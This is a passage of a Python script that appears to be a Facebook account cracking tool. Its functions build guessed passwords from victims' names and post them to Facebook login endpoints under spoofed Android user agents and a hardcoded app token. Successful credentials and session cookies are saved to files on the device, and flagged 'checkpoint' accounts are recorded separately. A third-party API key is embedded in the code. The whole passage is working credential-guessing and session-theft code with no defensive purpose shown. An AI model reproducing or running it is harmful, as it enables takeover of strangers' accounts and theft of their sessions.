'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
    gtt = random.choice(AMSS2)
    ua1 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.10."+str(random.choice(range(150,300)))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]'
    ua2 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.18."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua3 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.31."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]'
    ua4 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.44."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/TELEKOM.RO;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/MAR-LX1A;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2107};FB_FW/1;]'
    ua5 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.8."+str(random.choice(range(150,300)))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]'
    ua6 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.15."+str(random.choice(range(150,300)))+";FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{str(gtt)};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua7 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.40."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]'
    ua8 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.29."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/th_TH;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua9 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.14."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_PH;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]'
    ua10 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.18."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua11 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.9."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo TB-X505F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.0,width=1280,height=784};FB_FW/1;]'
    ua12 = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.22."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12])
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
#▬▭▬▭▬▭▬▭[ FILE MATHID - 1 ]▬▭▬▭▬▭▬▭#
def sxr_f_m1(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[{b} SMILE-M1{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107435;FBDM/{density=1.75,width=720,height=1280};FBLC/pt_PT;FBRV/87595196;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            uaD2 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; CPH2023 Build/PQ3B."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/247.0.0.42.116;FBBV/182642072;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/184895505;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
            uaD3 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; SM-A015F Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/253.0.0.28.116;FBBV/193013911;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/194773382;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1706;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            uaD4 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; 21061119AG Build/RP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653424;FBDM/{density=3.375,width=1080,height=1758};FBLC/en_US;FBRV/210964070;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            uaD5 = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; SM-M045F Build/QD4A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/212345419;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            uaD6 = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; KB2001 Build/SD2A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027750;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/LAVA;FBBD/LAVA;FBPN/com.facebook.katana;FBDV/Z81;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            hixi = random.choice([uaD1,uaD2,uaD3,uaD4,uaD5,uaD6])
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":hixi,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://api.facebook.com/auth/login"
            sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in sxr_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')
                oks.append(ids)
                uid=str(ids)
                Elite(uid,pww,coki)
                break
            elif 'www.facebook.com' in sxr_respns['error']['message']:
                #print(f"\r\r {c}[SMILE-CP] {ids} | {pww}")
                open('/sdcard/SMILE-FILE-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ FILE MATHID - 2 ]▬▭▬▭▬▭▬▭#
def sxr_f_m2(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[{b}SMILE-M2{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            sm_mdl=('SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V')
            fbCa = "arm64-v8a:armeabi-v7a:armeabi","arm64-v8a:null","armeabi-v7a:armeabi","x86:armeabi-v7a"
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; Infinix_X521 Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/233.0.0.45.120;FBBV/244745280;FBDM/{density=1.75,width=1600,height=800};FBLC/en_US;FBRV/248799264;FB_FW/2;FBCR/Verizon Wireless;FBMF/Infinix;FBBD/infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/10.2.5;FBOP/20;FBCA/arm64-v8a:;]"
            uaD2 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; CPH1923 Build/PQ3B."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/280.0.0.16.112;FBBV/193736398;FBDM/{density=1.0,width=1600,height=800};FBLC/en_US;FBRV/195707813;FB_FW/2;FBCR/MTN;FBMF/OPPO;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH1923;FBSV/13.2.2;FBOP/19;FBCA/arm64-v8a:;]"
            uaD3 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; SM-G930F Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/277.0.0.10.87;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/194751270;FBCR/MTN;FBMF/Samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/11.7.7;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;FBRV/0;]"
            uaD4 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; vivo 1904 Build/RP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/318.0.0.31.119;FBBV/419772799;FBDM/{density=1.0,width=1600,height=800};FBLC/en_US;FBRV/428799975;FB_FW/2;FBCR/LoneStar;FBMF/Xiaomi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/vivo 1904;FBSV/8.5.0;FBOP/19;FBCA/arm64-v8a:;]"
            uaD5 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; SM-A307FN Build/QD4A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/192.0.0.12.101;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/204773189;FBCR/VIVACOM;FBMF/Samsung;FBBD/samsung;FBDV/SM-A307FN;FBSV/11.9.2;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1200,height=1852};]"
            uaD6 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; GM1901 Build/SD2A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/224.0.0.36.112;FBBV/230241242;FBDM/{density=2.75,width=1200,height=1852};FBLC/en_US;FBRV/220224016;FB_FW/2;FBCR/LoneStar;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/GM1901;FBSV/8.6.3;FBOP/20;FBCA/armeabi-v7a:armeabi;]"
            uaD7 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.75,width=1080,height=2088};FBLC/en_US;FBRV/0;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3a;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518826;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/203119134;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281685;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/207024646;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            hixi = random.choice([uaD1,uaD2,uaD3,uaD4,uaD5,uaD6,])
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":hixi,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://api.facebook.com/auth/login"
            sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in sxr_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')
                oks.append(ids)
                uid=str(ids)
                Elite(uid,pww,coki)
                break
            elif 'www.facebook.com' in sxr_respns['error']['message']:
                #print(f"\r\r {c}[SMILE-CP] {ids} | {pww}")
                open('/sdcard/SMILE-FILE-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ FILE MATHID - 3 ]▬▭▬▭▬▭▬▭#
def sxr_f_m3(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[{b}SMILE-M3{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            session = requests.Session()
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            mdlx = ('SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V')
            sm_mdl=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_mdl))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            uax = "Mozilla/5.0 (Linux; Android 9; SM-J701MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"
            git_fb = session.get("https://m facebook.com").text
            logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
            user_info = {'Host': 'x.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"CPH2417"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': ua3,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
            'sec-ch-ua-platform-version': '"8.7.2"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': 'https://p.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://free.facebook.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            sxr_respns = session.post(url,data=logn_data,headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                print(f"\r\r {b}[SUCCESS-💚] {uid} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(uid+'|'+pww+'|'+coki+'\n')
                open("/sdcard/SMILE-FILE-OK.txt","a").write(uid+'|'+pww+'\n')                
                oks.append(uid)
                Elite(uid,pww,coki)
                break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                #print(f"\r\r {c}[SMILE-CP] {ids} | {pww}")
                open('/sdcard/SMILE-FILE-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ FILE MATHID - 4 ]▬▭▬▭▬▭▬▭#
def sxr_f_m4(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[{b} SMILE-M4{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
